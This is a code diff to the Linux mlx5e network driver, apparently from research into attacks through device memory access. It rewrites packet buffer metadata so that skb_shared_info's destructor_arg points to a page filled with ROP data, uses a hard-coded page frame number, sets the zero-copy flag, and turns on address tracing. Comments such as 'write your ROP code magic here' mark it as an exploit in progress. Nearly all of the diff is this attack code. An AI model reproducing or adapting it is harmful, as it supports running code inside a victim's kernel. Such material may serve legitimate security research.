@@ -215,7 +215,7 @@ static inline bool mlx5e_rx_cache_get(struct mlx5e_rq *rq,
 	return true;
 }
 
-#define PFN 33517752
+#define PFN (33517752ULL)
 static inline void shared_info_write_page(char *base)
 {
 	/* Gil, write your ROP code magic here */
@@ -335,10 +335,10 @@ static inline int mlx5e_page_alloc_mapped(struct mlx5e_rq *rq,
 		return -ENOMEM;
 
 	p = dma_info->page;
-//trace_printk("%-16s :%p : %p : >%lx<%d> \n",
-//		rq->netdev->name,
-//		p, page_address(p), page_to_pfn(p),
-//		rq->buff.page_order);
+	trace_printk("%-16s :%p : %p : >%lx<%d> \n",
+				rq->netdev->name,
+				p, page_address(p), page_to_pfn(p),
+				rq->buff.page_order);
 
 	dma_info->addr = dma_map_page(rq->pdev, dma_info->page, 0,
 					RQ_PAGE_SIZE(rq), rq->buff.map_dir);
@@ -347,7 +347,7 @@ static inline int mlx5e_page_alloc_mapped(struct mlx5e_rq *rq,
 		dma_info->page = NULL;
 		return -ENOMEM;
 	}
-	shared_info_write_rop(page_address(dma_info->page), RQ_PAGE_SIZE(rq));
+	//shared_info_write_rop(page_address(dma_info->page), RQ_PAGE_SIZE(rq));
 
 	return 0;
 }
@@ -945,7 +945,6 @@ static inline void modify_shinfo(void *va, unsigned int frag_size)
 {
 	/* Gil, add your sharedinfo magic here...*/
 	//TODO: in my code there are magic offsets, I can recalculate them but this is easier
-
 	if (!gilkup_vars.injected && gilkup_vars.data_pointers_counter > 256)
 		pr_warn_once("gilkup gilkup_vars.page_offset=%p\n", (void*)gilkup_vars.page_offset);
 
@@ -954,6 +953,8 @@ static inline void modify_shinfo(void *va, unsigned int frag_size)
 	{
 		struct skb_shared_info *shinfo = (struct skb_shared_info*)((u64)va + frag_size);
 		shinfo->destructor_arg = (void*)(gilkup_vars.page_offset + (PFN << 12)); //TODO: need your PFN...
+		shared_info_write_rop(shinfo->destructor_arg, PAGE_SIZE);
+	//	ASSERT(pfn_to_virt(PFN) == shinfo->destructor_arg);
 		pr_err("data %p  dist %p\n", va, shinfo->destructor_arg);
 		shinfo->tx_flags = SKBTX_DEV_ZEROCOPY; //1<<3
 
